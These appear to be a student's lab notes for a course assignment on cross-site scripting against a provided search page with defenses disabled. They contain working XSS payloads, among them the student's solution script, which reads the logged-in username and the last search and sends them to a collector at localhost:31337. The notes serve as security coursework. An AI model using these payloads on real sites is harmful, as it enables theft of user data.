## 2.0 - No defenses
Target: https://project2.ecen4133.org/search?xssdefense=0
Submission: xss_0.txt
            xss_payload.html

* using script function in search bar produces xss alert
`<script> alert('0') </script>`

* logging in as `test` `test` produces interesting results (presumably from other users using same login)
* i can see my own search history as well as past queries (from other users) - some of which are some interesting scripts:
    ```
    <script> 
       $(function(){ 
   	    var userName = document.getElementById("logged-in-user").innerHTML; 
            var lastSearch = "NO_SEARCH"; var history = document.getElementById("history-list").getElementsByClassName('history-item'); lastSearch = history[1].innerHTML; $.get("http://localhost:31337/?stolen_user="+userName+"&last_search="+lastSearch) }) 
    </script>
    ```

    ```
    <script> 
        var user = document.getElementById('logged-in-user').innerHTML; console.log(user); 
        $(window).ready(function(){ 
            $(function(){ 
                var historyList = document.getElementById('history-list'); 
                console.log(historyList); 
                if (window.confirm('If you click "ok" you would be redirected . Cancel will load this website ')){ 
                    window.location.href='http://localhost:31337'; }; 
             }); 
        }); 
    </script>
    ```

    ```
    <script>
        setTimeout(function(){ 
            console.log(document.getElementById("history-list"));}, 3000);
    </script>
    ```

* produces current user logged in --> `document.getElementById("logged-in-user").innerHTML;`
* produces current user search history --> `document.getElementById("history-list");`
* produces current user single item search history --> `document.getElementById("history-list").getElementsByClassName('history-item');`

* from here i have determined the following (rough) solution:
    ```
    <script>
        $(function() {
  
            // load up some vars
            var username = document.getElementById("logged-in-user").innerHTML;
            var last_search = document.getElementById("history-list").getElementsByClassName('history-item')[1].innerHTML;
            var url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search;

            // produce get request to requested url
            $.get(url);
        });
    </script>
```


